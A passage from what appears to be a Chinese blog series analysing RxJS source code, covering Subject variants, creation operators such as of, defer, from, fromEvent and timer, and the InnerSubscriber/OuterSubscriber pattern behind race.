console.log(&quot;订阅数据B：&quot; + value);});// 订阅后调用会打印数据。subject.next(2);// 打印结果// 订阅数据A：0// 订阅数据A：1// 订阅数据B：1// 订阅数据A：2// BehaviorSubject 拥有一个 _value 成员，每次调用 next 发送数据的时候，BehaviorSubject 都会将数据保存到 _value 中。 12345678910111213141516171819export class BehaviorSubject&lt;T&gt; extends Subject&lt;T&gt; { constructor(private _value: T) { super(); } get value(): T { return this.getValue(); } getValue(): T { if (this.hasError) { throw this.thrownError; } else if (this.closed) { throw new ObjectUnsubscribedError(); } else { return this._value; } }} 调用 next 的时候，会把传入的 value 保存起来，并交由 Subject 的 next 来处理。 123next(value: T): void { super.next(this._value = value);} 当 BehaviorSubject 被订阅的时候，也会把当前存储的数据发送给订阅者，通过重写 _subscribe 实现这个功能。 12345678_subscribe(subscriber: Subscriber&lt;T&gt;): Subscription { const subscription = super._subscribe(subscriber); // 只要订阅器没有关闭，那么就将当前存储的数据发送给订阅者。 if (subscription &amp;&amp; !(&lt;SubscriptionLike&gt;subscription).closed) { subscriber.next(this._value); } return subscription;} AsyncSubjectAsyncSubject 并没有提供相应的异步操作，而是把控制最终数据到来的权力交给调用者，订阅者只会接收到 AsyncSubject 最终的数据。正如官方例子所展示的的，当它单独调用 next 的时候，订阅者并不会接收到数据，而只有当它调用 complete 的时候，订阅者才会接收到最终到来的消息。以下例子可以说明 AsyncSubject 的运作方式。 123456789101112131415161718192021222324const subject = new AsyncSubject&lt;number&gt;();const subscriptionA = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据A：&quot; + value);});// 此处不会触发订阅subject.next(1);subject.next(2);subject.next(3);subject.next(4);const subscriptionB = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据B：&quot; + value);});// 同样，这里不会触发订阅subject.next(5);// 但是完成方法会触发订阅subject.complete();// 打印结果// 订阅数据A：5// 订阅数据B：5 AsyncSubject 通过保留发送状态和完成状态，来达到以上目的。 12345export class AsyncSubject&lt;T&gt; extends Subject&lt;T&gt; { private value: T = null; private hasNext: boolean = false; private hasCompleted: boolean = false;} AsyncSubject 的 next 不会调用 Subject 的 next，而是保存未完成状态下最新到来的数据。 123456next(value: T): void { if (!this.hasCompleted) { this.value = value; this.hasNext = true; }} 那么 Subject 的 next 会在 AsyncSubject 的 complete 方法中调用。 1234567complete(): void { this.hasCompleted = true; if (this.hasNext) { super.next(this.value); } super.complete();} ReplaySubjectReplaySubject 的作用是在给定的时间内，发送所有的已经收到的缓冲区数据，当时间过期后，将销毁之前已经收到的数据，重新收集即将到来的数据。所以在构造的时候，需要给定两个值，一个是缓冲区的大小（bufferSize），一个是给定缓冲区存活的窗口时间（windowTime），需要注意的是 ReplaySubject 所使用的缓冲区的策略是 FIFO。 下面举出两个例子，可以先感受一下 ReplaySubject 的行为。第一个如下： 1234567891011121314151617181920212223const subject = new ReplaySubject&lt;string&gt;(3);const subscriptionA = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据A：&quot; + value);});subject.next(1);subject.next(2);subject.next(3);subject.next(4);const subscriptionB = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据B：&quot; + value);});// 打印结果：// 订阅数据A: 1// 订阅数据A: 2// 订阅数据A: 3// 订阅数据A: 4// 订阅数据B：2// 订阅数据B：3// 订阅数据B：4 下面是第二个例子，这个 ReplaySubject 带有一个窗口时间。 12345678910111213141516171819202122232425const subject = new ReplaySubject&lt;string&gt;(10, 1000);const subscriptionA = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据A：&quot; + value);});subject.next(&quot;number&quot;);subject.next(&quot;string&quot;);subject.next(&quot;object&quot;);subject.next(&quot;boolean&quot;);setTimeout(() =&gt; { subject.next(&quot;undefined&quot;); const subscriptionB = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据B：&quot; + value); });}, 2000);// 打印结果// 订阅数据A：number// 订阅数据A：string// 订阅数据A：object// 订阅数据A：boolean// 订阅数据A：undefined// 订阅数据B：undefined 其实 ReplaySubject 跟 BehaviorSubject 很类似，但是不同的点在于，ReplaySubject 多了缓冲区和窗口时间，也算是扩展了 BehaviorSubject 的使用场景。 在源码中，还有第三个参数，那就是调度器（scheduler），一般来说，使用默认调度器已经可以覆盖大部分需求，关于调度器的部分会在之后讲到。 1234567891011121314151617181920212223export class ReplaySubject&lt;T&gt; extends Subject&lt;T&gt; { private _events: (ReplayEvent&lt;T&gt; | T)[] = []; private _bufferSize: number; private _windowTime: number; private _infiniteTimeWindow: boolean = false; constructor( bufferSize: number = Number.POSITIVE_INFINITY, windowTime: number = Number.POSITIVE_INFINITY, private scheduler?: SchedulerLike ) { super(); this._bufferSize = bufferSize &lt; 1 ? 1 : bufferSize; this._windowTime = windowTime &lt; 1 ? 1 : windowTime; if (windowTime === Number.POSITIVE_INFINITY) { this._infiniteTimeWindow = true; this.next = this.nextInfiniteTimeWindow; } else { this.next = this.nextTimeWindow; } }} 上面的源码中，ReplaySubject 在构造时会根据不同的窗口时间来设置 next 具体的运行内容，主要以下两种方式。 nextInfiniteTimeWindow nextTimeWindow nextInfiniteTimeWindow如果窗口时间是无限的，那么就意味着缓冲区数据的约束条件只会是将来的数据。 12345678910private nextInfiniteTimeWindow(value: T): void { const _events = this._events; _events.push(value); // 根据数据长度和缓冲区大小，决定哪些数据留在缓冲区。 if (_events.length &gt; this._bufferSize) { _events.shift(); } super.next(value);} nextTimeWindow如果窗口时间是有限的，那么缓冲区的约束条件就由两条组成：窗口时间和将来的数据。这时，缓冲区数据就由 ReplayEvent 组成。ReplayEvent 保存了到来的数据的内容和其当前的时间戳。 123class ReplayEvent&lt;T&gt; { constructor(public readonly time: number, public readonly value: T) {}} 那么通过 _trimBufferThenGetEvents 对缓冲区数据进行生死判断后，再把完整的数据交由 Subject 的 next 发送出去。 123456private nextTimeWindow(value: T): void { this._events.push(new ReplayEvent(this._getNow(), value)); this._trimBufferThenGetEvents(); super.next(value);} _trimBufferThenGetEvents 这个方法是根据不同的 event 对象中的时间戳与当前的时间戳进行判断，同时根据缓冲区的大小，从而得到这个对象中的数据是否能够保留的凭证。 123456789101112131415161718192021222324252627282930313233private _trimBufferThenGetEvents(): ReplayEvent&lt;T&gt;[] { const now = this._getNow(); const _bufferSize = this._bufferSize; const _windowTime = this._windowTime; const _events = &lt;ReplayEvent&lt;T&gt;[]&gt;this._events; const eventsCount = _events.length; let spliceCount = 0; // 由于缓冲区的是 FIFO，所以时间的排 // 序一定是从小到大那么，只需要找到分 // 割点，就能决定缓冲数据的最小数据长 // 度。 while (spliceCount &lt; eventsCount) { if ((now - _events[spliceCount].time) &lt; _windowTime) { break; } spliceCount++; } // 缓冲区长度对切割的优先级会更高， // 所以如果超出了缓冲区长度，那么切 // 割点要由更大的一方决定。 if (eventsCount &gt; _bufferSize) { spliceCount = Math.max(spliceCount, eventsCount - _bufferSize); } if (spliceCount &gt; 0) { _events.splice(0, spliceCount); } return _events;} 订阅过程ReplaySubject 的订阅过程比较特殊，因为订阅的时候需要发送缓冲区数据，而且在不同时间进行订阅也会使得缓冲区中的数据变化，所以订阅是需要考虑的问题会比较多。那么，抓住 _infiniteTimeWindow 这个变量来看代码会变得很容易。 1234567891011121314151617181920212223242526272829303132333435363738// 以下源码省略了调度器相关的代码_subscribe(subscriber: Subscriber&lt;T&gt;): Subscription { const _infiniteTimeWindow = this._infiniteTimeWindow; // 窗口时间是无限的则不用考虑 // 窗口时间是有限的则更新缓冲区 const _events = _infiniteTimeWindow ? this._events : this._trimBufferThenGetEvents(); const len = _events.length; // 创建 subscription let subscription: Subscription; if (this.isStopped || this.hasError) { subscription = Subscription.EMPTY; } else { this.observers.push(subscriber); subscription = new SubjectSubscription(this, subscriber); } // 分类讨论不同的约束条件 if (_infiniteTimeWindow) { // 窗口时间不是无限的，缓冲区存储直接就是数据 for (let i = 0; i &lt; len &amp;&amp; !subscriber.closed; i++) { subscriber.next(&lt;T&gt;_events[i]); } } else { // 窗口时间不是无限的，缓冲区存储的是 ReplayEvent for (let i = 0; i &lt; len &amp;&amp; !subscriber.closed; i++) { subscriber.next((&lt;ReplayEvent&lt;T&gt;&gt;_events[i]).value); } } if (this.hasError) { subscriber.error(this.thrownError); } else if (this.isStopped) { subscriber.complete(); } return subscription;}","link":"/front-end/angular_rxjs_2/"},{"title":"RxJS 源码解析(三): Operator I","text":"在 RxJS 中，Creation Operator 主要分为以下两类： 执行一般创建操作的 Normal Creation Operator。 执行复杂的创建操作的 Join Creation Operator。 在 pipe 中使用的 operator ，我称之为 Pipe Operator ，它主要分为以下几类： 用于数据映射的 Transformation Operators 过滤用的 Filtering Operators 将当前的 Observable 多播化的 Multicasting Operators 处理错误的 Error Handling Operators 工具操作函数 Utility Operators Conditional and Boolean Operators Mathematical and Aggregate Operators 限于篇幅本篇将先介绍 Normal Creation Operator ，它的主要作用是帮助开发者快速创建 Observable。 作者：zcx链接：https://mp.weixin.qq.com/s/vIXe_cywMTv03njLLtvQNQ of , empty &amp; throwErrorof 、empty 、throwError ，首先讲这三个 operator 的重要原因是，它提供了一系列基础的操作：next、complete、以及 error。 1234567891011121314151617181920212223242526272829const observableA = of(1);const observableB = empty();const observableC = throwError(Error('test'));observableA.subscribe({ next: (v) =&gt; console.log('A: ' + v), complete: () =&gt; console.log('A: complete'); error: (e) =&gt; console.log('A: error is ' + e);});observableB.subscribe({ next: (v) =&gt; console.log('B: ' + v), complete: () =&gt; console.log('B: complete'); error: (e) =&gt; console.log('B: error is ' + e);});observableC.subscribe({ next: (v) =&gt; console.log('C: ' + v), complete: () =&gt; console.log('C: complete'), error: (e) =&gt; console.log(`C: error is (${e}).`),});// 打印结果// A: 1// A: complete// B: complete// C: error is Error: test of source code它的构建方式如下，其中，调度器是最后一个参数。 123456789export function of&lt;T&gt;(...args: Array&lt;T | SchedulerLike&gt;): Observable&lt;T&gt; { let scheduler = args[args.length - 1] as SchedulerLike; if (isScheduler(scheduler)) { args.pop(); return scheduleArray(args as T[], scheduler); } else { return fromArray(args as T[]); }} of 由两个函数 fromArray 和 scheduleArray。fromArray 是一个简单循环的函数，它将数据循环发送给 Observable 的订阅者。 123456789export function fromArray&lt;T&gt;(input: ArrayLike&lt;T&gt;) { return new Observable&lt;T&gt;((subscriber: Subscriber&lt;T&gt;) =&gt; { // 循环获取数据 for (let i = 0, len = array.length; i &lt; len &amp;&amp; !subscriber.closed; i++) { subscriber.next(array[i]); } subscriber.complete(); });} empty source code这部分的代码很简单，scheduler 部分可以忽略。实际上就是在 Observable 中调用 subscriber.complete()。 123456789export function empty(scheduler?: SchedulerLike) { if (scheduler) { return new Observable&lt;never&gt;((subscriber) =&gt; scheduler.schedule(() =&gt; subscriber.complete()) ); } else { return new Observable&lt;never&gt;((subscriber) =&gt; subscriber.complete()); }} throwError source codethrowError 跟 empty 的实现是一致的，只不过 complete 换成了 error 。 12345678910111213141516171819202122export function throwError( error: any, scheduler?: SchedulerLike): Observable&lt;never&gt; { if (!scheduler) { return new Observable((subscriber) =&gt; subscriber.error(error)); } else { return new Observable((subscriber) =&gt; scheduler.schedule(dispatch, 0, { error, subscriber }) ); }}// 以下是 调度器中想要执行的状态。interface DispatchArg { error: any; subscriber: Subscriber&lt;any&gt;;}// 最终执行的是 subcriber 的 error 方法。function dispatch({ error, subscriber }: DispatchArg) { subscriber.error(error);} iif &amp; deferiif 和 defer 的表现是一致的。 defer 的主要作用是延后了具体 Observable 的生成，是一个 Lazy Observable Factory。 iif 则是缩小了 defer 的表达范围，主要作用是增强了 Rx 的命令式的语义。 12345let test = false;const observableA = iif(() =&gt; test, of(&quot;1&quot;), of(&quot;2&quot;));const observableB = defer(function () { return test ? of(&quot;1&quot;) : of(&quot;2&quot;);}); iif Source Code看到 iif 的源码的那一刻我震惊了，什么叫大道至简（战术后仰）。 12345678export function iif&lt;T = never, F = never&gt;( condition: () =&gt; boolean, trueResult: SubscribableOrPromise&lt;T&gt; = EMPTY, falseResult: SubscribableOrPromise&lt;F&gt; = EMPTY): Observable&lt;T | F&gt; { // 直接调用了 defer return defer(() =&gt; (condition() ? trueResult : falseResult));} defer Source Codedefer 原理上比较简单：在构造 Observable 的时候，在传入的订阅函数中返回一个 Subscription。那么在这个传入的订阅函数中，defer 的过程分为以下三步： 调用工厂，获取输入数据。 调用 from 将数据转换成一个 observable 返回这个 observable 的订阅。 123456789101112131415161718192021export function defer&lt;R extends ObservableInput&lt;any&gt; | void&gt;( observableFactory: () =&gt; R): Observable&lt;ObservedValueOf&lt;R&gt;&gt; { return new Observable&lt;ObservedValueOf&lt;R&gt;&gt;((subscriber) =&gt; { let input: R | void; try { // 调用工厂函数，获取输入的数据。 input = observableFactory(); } catch (err) { subscriber.error(err); return undefined; } // 通过 from 将 input 转换为 observable。 const source = input ? from(input as ObservableInput&lt;ObservedValueOf&lt;R&gt;&gt;) : empty(); // 返回一个订阅器到外部。 return source.subscribe(subscriber); });} 其中的 ObservedValueOf 是这样定义的，使用了 ts 的 infer 来推导出 ObservableInput&lt;T&gt; 中 T 的具体类型。 123export type ObservedValueOf&lt;OV&gt; = OV extends ObservableInput&lt;infer T&gt; ? T : never; fromfrom 提供了一种映射的功能，可以将传入的数据映射成 Observables 。它可以接受以下参数： 原生数组 和 Iterable&lt;T&gt; dom 迭代器 Promise&lt;T&gt; Observable&lt;T&gt; 稍微的修剪了一下，源码如下： 123export function from&lt;T&gt;(input: ObservableInput&lt;T&gt;): Observable&lt;T&gt; { return new Observable&lt;T&gt;(subscribeTo(input));} 它直接创建一个新的 Observable，并且调用了 subscribeTo ，根据输入类型，对输入进行不同的处理。 如果输入是 Observable，调用 subscribeToObservable。 如果输入是原生数组，调用 subscribeToArray。 如果输入是 Promise，调用 subscribeToPromise。 如果输入是生成器，调用 subscribeToIterable subscribeToArray如果输入是原生数组或者是实现了数组功能的数据结构，那么直接调用 subscriber.next 把所有数据依次发送给订阅者。 12345678export const subscribeToArray = &lt;T&gt;(array: ArrayLike&lt;T&gt;) =&gt; ( subscriber: Subscriber&lt;T&gt;) =&gt; { for (let i = 0, len = array.length; i &lt; len &amp;&amp; !subscriber.closed; i++) { subscriber.next(array[i]); } subscriber.complete();}; subscribeToObservable如果输入是 Obervable，那么要通过一个特定的 Symbol 取出 Observable，然后再订阅它。 （基于 Symbol 的特性，当前很多项目都会使用一个固定的 Symbol 对特定数据取值，来验证这个数据是不是符合类型）。 123456789101112export const subscribeToObservable = &lt;T&gt;(obj: any) =&gt; ( subscriber: Subscriber&lt;T&gt;) =&gt; { const obs = obj[Symbol_observable](); if (typeof obs.subscribe !== &quot;function&quot;) { throw new TypeError( &quot;Provided object does not correctly implement Symbol.observable&quot; ); } else { return obs.subscribe(subscriber); }}; subscribeToPromise如果输入是一个 Promise，那么通过 then 获取到 Promise 的内容，并将内容发送给订阅者。 1234567891011121314export const subscribeToPromise = &lt;T&gt;(promise: PromiseLike&lt;T&gt;) =&gt; ( subscriber: Subscriber&lt;T&gt;) =&gt; { promise.then( (value) =&gt; { if (!subscriber.closed) { subscriber.next(value); subscriber.complete(); } }, (err: any) =&gt; subscriber.error(err) ); return subscriber;}; subscribeToIterable生成器跟数组的方式类似，也是通过循环的方式将数据发送给订阅者。 12345678910111213141516171819202122232425export const subscribeToIterable = &lt;T&gt;(iterable: Iterable&lt;T&gt;) =&gt; ( subscriber: Subscriber&lt;T&gt;) =&gt; { const iterator = (iterable as any)[Symbol_iterator](); do { let item: IteratorResult&lt;T&gt;; try { item = iterator.next(); } catch (err) { subscriber.error(err); return subscriber; } if (item.done) { subscriber.complete(); break; } subscriber.next(item.value); if (subscriber.closed) { break; } } while (true); return subscriber;}; generategenerate 可以让你用一种类似 for 循环的方式获得数据流。不过，我目前还没有遇到过非常需要这种方式生成流的方式，如果你遇到这种情况，欢迎交流。一般来说，我习惯于这样调用它 123456789101112131415const observable = generate({ initialState: 1, condition: (x) =&gt; x &lt; 5, iterate: (x) =&gt; x + 1,});observable.subscribe((value) =&gt; { console.log(value);});// 打印结果// 1// 2// 3// 4 原来的源码包含了较多的参数判断，把内部逻辑梳理一下，实际上就是分为三个大步骤： 判断结束条件， 如果为假代表已经结束，则应该完成订阅，否则进行下一步。 发送数据订阅给到订阅者。 调用迭代方法，生成下一组数据，重复第一步。 1234567891011121314151617181920212223242526272829303132export function generate&lt;S&gt;(options: GenerateOptions&lt;S&gt;): Observable&lt;S&gt; { const initialState = options.initialState; const condition = options.condition; const iterate = options.iterate; // 返回 Observable return new Observable&lt;S&gt;((subscriber) =&gt; { let state = initialState; try { while (true) { // 判断结束条件 if (condition &amp;&amp; !condition(state)) { subscriber.complete(); break; } // 发送数据给订阅者 subscriber.next(state); // 调用迭代，获取下一组数据 state = iterate(state); if (subscriber.closed) { break; } } } catch (err) { subscriber.error(err); } return undefined; });} 其中 GenerateOptions 包含了三个成员，initialState，condition 以及 iterate 。 12345678910export interface GenerateOptions&lt;S&gt; { // 初始状态 initialState: S; // 结束条件 condition?: (x: S) =&gt; boolean; // 迭代方式 iterate: (x: S) =&gt; S;} rangerange 可以创建一个给定范围的数字流。这个主要就是提供了一个简单的语义化函数，主要就是通过循环给订阅者喂数据。 1234567891011121314151617export function range(start: number = 0, count?: number): Observable&lt;number&gt; { return new Observable&lt;number&gt;((subscriber) =&gt; { if (count === undefined) { count = start; start = 0; } for (let index = 0; index &lt; count; ++index) { subscriber.next(start + index); if (subscriber.closed) { break; } } return undefined; });} fromEvent &amp; fromEventPatternfromEventfromEvent 是的 Observable 可以封装一系列的系统事件。既可以接受 NodeJS EventEmitter，也可以接受 DOM EventTarget， JQuery-like event target, NodeList 或者 HTMLCollection 等浏览器对象。 1234567const clicksA = fromEvent(document, &quot;click&quot;);const clicksB = fromEvent($(document), &quot;click&quot;);clicksA.subscribe((x) =&gt; console.log(&quot;A: &quot;, x));clicksB.subscribe((x) =&gt; console.log(&quot;B: &quot;, x));// 每当点击一下页面，都会打印出 event 。 它的实现很简单，根据 target 的对象类型调用其对应的事件监听函数，然后通过 subscriber 调用 next 获取到订阅的输出。为了方便阅读，我稍微的改了一下，让 fromEvent 只支持 DOM EventTarget。 123456789101112131415161718192021222324252627282930313233export interface HasEventTargetAddRemove&lt;E&gt; { addEventListener( type: string, listener: ((evt: E) =&gt; void) | null, options?: boolean | AddEventListenerOptions ): void; removeEventListener( type: string, listener?: ((evt: E) =&gt; void) | null, options?: EventListenerOptions | boolean ): void;}// 一个只支持 DOM EventTarget 的 fromEventexport function fromEvent&lt;T&gt;( target: HasEventTargetAddRemove&lt;T&gt;, eventName: string, options?: EventListenerOptions): Observable&lt;T&gt; { return new Observable&lt;T&gt;((subscriber) =&gt; { // 处理结果 const handler = (...e: T[]) =&gt; subscriber.next(e.length === 1 ? e[0] : e); // 调用 addEventListener，并让其在 handler 中处理。 target.addEventListener(eventName, handler, options); // 取消订阅的时候，直接调用 removeEventListener 对 dom 取消订阅。 // 返回的是一个函数，这个函数负责了取消订阅的时，所做的内容。 return () =&gt; { target.removeEventListener(eventName, handler, options); }; });} 上面的代码可以分解成这三个步骤： 在闭包中创建一个 handler 函数，handler 函数最终会调用 subscriber.next。 为 target 添加指定事件监听。 为 subscriber 添加一个销毁 target 事件监听的逻辑。 对于其他的事件监听，不再赘述，流程完全是一样。 fromEventPatternfromEventPattern 则是对 fromEvent 的泛化。 123456789101112function addClickHandler(handler) { document.addEventListener(&quot;click&quot;, handler);}function removeClickHandler(handler) { document.removeEventListener(&quot;click&quot;, handler);}const clicks = fromEventPattern(addClickHandler, removeClickHandler);clicks.subscribe((x) =&gt; console.log(x));// 点击的时候，就会输出点击事件。 它的源码的与 fromEvent 类似。 1234567891011121314151617181920212223242526export type NodeEventHandler = (...args: any[]) =&gt; void;export function fromEventPattern&lt;T&gt;( addHandler: (handler: NodeEventHandler) =&gt; any, removeHandler?: (handler: NodeEventHandler, signal?: any) =&gt; void): Observable&lt;T | T[]&gt; { return new Observable&lt;T | T[]&gt;((subscriber) =&gt; { const handler = (...e: T[]) =&gt; subscriber.next(e.length === 1 ? e[0] : e); // 有一点不同的地方在于，获取了返回值 addHandler 的返回值 let retValue: any; try { retValue = addHandler(handler); } catch (err) { subscriber.error(err); return undefined; } if (!isFunction(removeHandler)) { return undefined; } // 然后在这里传入 removeHandler 中 return () =&gt; removeHandler(handler, retValue); });} bindCallback， bindNodeCallback它们都是一种特殊的 Operator ，思路应该是源于 Function.bind ，提供一种转换操作，将带有回调的函数转换成 Observable Factory。 123456789101112131415161718192021222324252627282930function setTimeoutWithCallback(callback: () =&gt; void) { setTimeout(() =&gt; { callback(); }, 2000);}const obfactory = bindCallback(setTimeoutWithCallback);const ob1 = obfactory();const ob2 = obfactory();const now = Date.now();ob1.subscribe(() =&gt; { console.log(&quot;ob1&quot; + (Date.now() - now));});setTimeout(() =&gt; { ob1.subscribe(() =&gt; { console.log(&quot;ob1 later: &quot; + (Date.now() - now)); }); ob2.subscribe(() =&gt; { console.log(&quot;ob2: &quot; + (Date.now() - now)); });}, 3000);// 打印结果：// ob1: 2001// ob1 later: 3004// ob2: 5008 以下是 bindNodeCallback 的例子。 1234567891011121314151617181920212223242526272829/* file: ~/desktop/test.json { &quot;name&quot;: &quot;Hello World&quot; } */import * as fs from &quot;fs&quot;;const readerFactory = bindNodeCallback(fs.readFile);const reader$ = readerFactory(&quot;./src/person.json&quot;);reader$.subscribe({ next: (value) =&gt; console.log(value.toString()), error: (err) =&gt; console.log(err), complete: () =&gt; console.log(&quot;complete&quot;),});// 如果没有错误，打印结果如下：// { name: 'Hello World' }// complete// 如果有错误，打印结果如下：// [Error: ENOENT: no such file or directory, open './src/person.json'] {// errno: -2,// code: 'ENOENT',// syscall: 'open',// path: './src/person'// } bindCallback 和 bindNodeCallback 的源码非常类似。 1234567891011121314151617181920212223242526export function bindCallback&lt;T&gt;( callbackFunc: Function): (...args: any[]) =&gt; Observable&lt;T&gt; { return function (this: any, ...args: any[]): Observable&lt;T&gt; { const context = this; // let subject: AsyncSubject&lt;T&gt;; return new Observable&lt;T&gt;((subscriber) =&gt; { if (!subject) { subject = new AsyncSubject&lt;T&gt;(); const handler = (...innerArgs: any[]) =&gt; { subject.next(innerArgs.length &lt;= 1 ? innerArgs[0] : innerArgs); subject.complete(); }; try { callbackFunc.apply(context, [...args, handler]); } catch (err) { subject.error(err); } } return subject.subscribe(subscriber); }); };} bindCallback 和 bindNodeCallback 的源码唯一不同的地方就是在于 handler 这个函数处理的内容不同，bindNodeCallback 传入的函数的回调，第一个参数为是错误信息。 12345678910const handler = (...innerArgs: any[]) =&gt; { const err = innerArgs.shift(); // 如果第一个参数存在，说明有问题。 if (err) { subject.error(err); return; } subject.next(innerArgs.length &lt;= 1 ? innerArgs[0] : innerArgs); subject.complete();}; 源码中比较有趣的地方在于，创建的时候，返回的工厂函数包含了一个 AsyncSubject。这个 AsyncSubject 保存了已经到来数据，可以看看例子中，ob1 被订阅了 2 次，第二次订阅后实际上是立刻就能拿到返回值；而 ob2 仍要执行一次 setTimeoutWithCallback。这种设计与这个 bind 的语义相吻合。 interval &amp; timer上面的 operators 中，我已经把 scheduler 相关的内容进行了裁剪，基本上与 scheduler 无关。而 interval 和 timer 都必须通过 scheduler 来相应的定时操作，所以这部分放到了最后。它们是用于创建定时数据源的 operators 。 interval： 传入的参数表示每隔指定毫秒发送一条数据。 timer：传入的第一个参数是指第一条发送数据的时间间隔，第二个参数是指后续数据发送的间隔。 123456789101112131415161718192021const observableA = interval(1000).pipe(take(2));const observableB = timer(500, 1000).pipe(take(3));console.log(&quot;hello&quot;);observableA.subscribe((value) =&gt; { console.log(&quot;A: &quot; + value);});observableB.subscribe((value) =&gt; { console.log(&quot;B: &quot; + value);});// 打印结果// hello// B: 0// A: 0// B: 1// A: 1// B: 2 interval 和 timer 都使用了一个默认的异步调度器，这个异步调度器主要是通过 setInterval 来实现相应的功能，实际上 Rx 把异步调度器通过 interval 和 timer 转化成 Observable 的形式提供到给用户。 timer Source Codetimer 的实现如下图所示。它首先创建了一个 Observable ，然后在订阅函数中，返回调度器的订阅。在这里， scheduler 的 schedule 函数返回了一个 Subscription。 123456789101112131415161718192021222324export function timer( dueTime: number | Date = 0, period: number, scheduler: SchedulerLike = async): Observable&lt;number&gt; { return new Observable((subscriber) =&gt; { let due = 0; // 判断是不是 Date 类型 if (dueTime instanceof Date) { due = +dueTime - scheduler.now(); } // 判断是不是 number 类型 if (isNumeric(dueTime)) { due = dueTime as number; } // 此处调用跟 interval 类似。 return scheduler.schedule(dispatch, due, { index: 0, period, subscriber, }); });} dispatch 实际上是一个递归函数，这个函数绑定了 SchedulerAction ，通过传入订阅者，使得 Action 内部的 setInterval 能够一直调用 subscriber.next。 12345678910111213141516171819interface TimerState { index: number; period: number; subscriber: Subscriber&lt;number&gt;;}function dispatch(this: SchedulerAction&lt;TimerState&gt;, state: TimerState) { const { index, period, subscriber } = state; subscriber.next(index); if (subscriber.closed) { return; } else if (period === -1) { return subscriber.complete(); } state.index = index + 1; this.schedule(state, period);} interval Source Code以下是 interval 的源码。 123456789101112131415export function interval(period = 0): Observable&lt;number&gt; { if (!isNumeric(period) || period &lt; 0) { period = 0; } const scheduler = async; return new Observable&lt;number&gt;((subscriber) =&gt; { // 订阅器接收 scheduler 的订阅结果。 subscriber.add( scheduler.schedule(dispatch, period, { subscriber, counter: 0, period }) ); return subscriber; });} 仔细的分析上面的代码，我发现 interval 的实现实际上就是 timer 的一个约束版本，它可以改写成这样 12345678910export function interval( period = 0, scheduler: SchedulerLike = async): Observable&lt;number&gt; { if (!isNumeric(period) || period &lt; 0) { period = 0; } return timer(period, period, sch);}","link":"/front-end/angular_rxjs_3/"},{"title":"RxJS 源码解析(四): Operator II","text":"在本文开始之前，先定义一些自定义术语，方便阅读。 顶流：调用了操作符的流。 上游流：操作符的内部订阅器所订阅的流。 下游流：由操作符的内部订阅器管理的流。 终结订阅：订阅了操作符生成的流的订阅者。 我并不打算像上一篇那样，抓着几个操作符一顿输出。从这篇开始，无论是 Join Operator、还是 Transformation Operator，都有很大的规律性。所以我想先总结出来它们的规律，再来对 operator 进行分析。 作者：zcx链接：https://mp.weixin.qq.com/s/1b141waT_tAxZR-PZC79kg 如何控制下游流为了让操作符可以控制下游流，RxJS 通过委托模式，让操作符生成的了一个特定的 Subscriber，它在内部就能拿到所有传入的下游流的订阅。因此，在这里先介绍两个 Subscriber： OuterSubscriber 和 InnerSubscriber 。 OuterSubscriber ：相当于委托者，提供了三个 notify 的接口—— notifyNext， notifyComplete， notifyError 。 InnerSubscriber ：相当于被委托者，在它构造的时候需要传入 OuterSubscriber ，之后触发相对应的订阅操作，它会去调用 OuterSubscriber 相对应的 notify 接口。 其内部实现实际上就是把 InnerSubscriber 的 next，error，complete 转发给 OuterSubscriber 。 12345678910111213141516171819202122232425262728293031export class InnerSubscriber&lt;T, R&gt; extends Subscriber&lt;R&gt; { private index = 0; constructor( private parent: OuterSubscriber&lt;T, R&gt;, public outerValue: T, public outerIndex: number ) { super(); } protected _next(value: R): void { this.parent.notifyNext( this.outerValue, value, this.outerIndex, this.index++, this ); } protected _error(error: any): void { this.parent.notifyError(error, this); this.unsubscribe(); } protected _complete(): void { this.parent.notifyComplete(this); this.unsubscribe(); }} 而 OuterSubscriber 的默认实现则是将数据交由终结订阅转发出去。 12345678910111213141516171819export class OuterSubscriber&lt;T, R&gt; extends Subscriber&lt;T&gt; { notifyNext( outerValue: T, innerValue: R, outerIndex: number, innerIndex: number, innerSub: InnerSubscriber&lt;T, R&gt; ): void { this.destination.next(innerValue); } notifyError(error: any, innerSub: InnerSubscriber&lt;T, R&gt;): void { this.destination.error(error); } notifyComplete(innerSub: InnerSubscriber&lt;T, R&gt;): void { this.destination.complete(); }} 不同的操作符可能会要生成不同的 Subscriber，而生成这些 Subscriber 都会调用 subscribeToResult。这个函数会根据传入的 ObservableInput ，进行类型判断，并返回一个正确处理后的订阅。这里为了可以复用，就调用了之前 from 也使用过的 subscribeTo ，在这个函数中，会处理列表、Promise、以及生成器等数据并返回一个订阅。 12345678910111213141516171819export function subscribeToResult&lt;T, R&gt;( outerSubscriber: OuterSubscriber&lt;T, R&gt;, result: any, outerValue?: T, outerIndex: number = 0, innerSubscriber: Subscriber&lt;R&gt; = new InnerSubscriber( outerSubscriber, outerValue, outerIndex )): Subscription | undefined { if (innerSubscriber.closed) { return undefined; } if (result instanceof Observable) { return result.subscribe(innerSubscriber); } return subscribeTo(result)(innerSubscriber) as Subscription;} 通过这种设计，使得生成的 Subscriber 拥有控制下游流状态的能力。这种能力可以使得数据装箱和拆箱都放在同一个 Subscriber 中，同时这样做也把副作用集中在一个订阅器中处理，使得操作符在表现上像纯函数一样。 下面以及下一篇的内容中，会出现大量 subscribeToResult ，我们只需要知道，这个函数将订阅的数据或信息转发到了 OuterSubscriber 的相关接口中，它的功能不再赘述。 最后，我们还是要回归到 operators 的源码分析上。因为整体规律和设计已经了解完毕，那么分析每一个 operator 的时候，也能通过这些规律来理解某一部分的 operators 为什么要这样设计。 在这里，我们继续沿着上一篇的内容，先分析 Join Creation Operators。 race所谓 race，意味着所有的流都在进行一场赛跑，跑赢的流可以留下并继续发送数据，没跑赢的只能取消订阅。 123456789const first = interval(1000).pipe(take(1), mapTo(&quot;first&quot;));const second = interval(2000).pipe(take(1), mapTo(&quot;second&quot;));const race$ = race(first, second);race$.subscribe((v) =&gt; console.log(v));// 打印结果// first race 通过 fromArray 的方式，将输入的 Observable 交由内部订阅器来处理。 123export function race&lt;T&gt;(...observables: ObservableInput&lt;any&gt;[]): Observable&lt;T&gt; { return fromArray(observables).lift(new RaceOperator&lt;T&gt;());} RaceSubscriberRaceSubscriber 保存了这么几个状态。 123private hasFirst: boolean = false;private observables: Observable&lt;any&gt;[] 